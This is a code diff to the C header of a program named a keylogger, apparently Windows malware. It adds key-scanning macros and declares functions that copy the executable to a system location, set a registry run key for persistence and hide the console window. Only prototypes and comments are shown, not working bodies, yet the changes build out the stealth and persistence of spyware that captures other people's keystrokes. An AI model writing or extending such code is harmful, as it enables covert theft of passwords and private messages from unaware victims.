@@ -16,7 +16,12 @@
 #define KEY_PRESSED 0x8000
 #define CAPSLOCK_MASK 0x0001
 
-/* functions */
+// New macros for key scanning boundaries and sleep interval
+#define KEY_CODE_MIN 8
+#define KEY_CODE_MAX 256
+#define SLEEP_INTERVAL_MS 10
+
+/* function prototypes */
 /**
  * Logs the input string to the log file.
  *
@@ -53,5 +58,36 @@ void handleKeyPress(int key);
  * @param key The key code.
  */
 void handleKeyRelease(int key);
+
+/**
+ * Creates a directory at the specified target path if it does not already exist.
+ *
+ * @param targetPath The directory path.
+ */
+void create_directory(char *targetPath);
+
+/**
+ * Copies the executable file to a system location for persistence.
+ *
+ * @param targetPath The buffer to store the target path.
+ */
+void copyToSystemLocation(char *targetPath);
+
+/**
+ * Sets the registry key for persistence to automatically run the copied executable.
+ *
+ * @param targetPath The path of the copied executable.
+ */
+void setRegistryPersistence(const char *targetPath);
+
+/**
+ * Performs the persistence operations: copying the file and setting registry.
+ */
+void persistence();
+
+/**
+ * Hides the console window.
+ */
+void hideConsole();
 
 #endif // KEYLOGGER_H
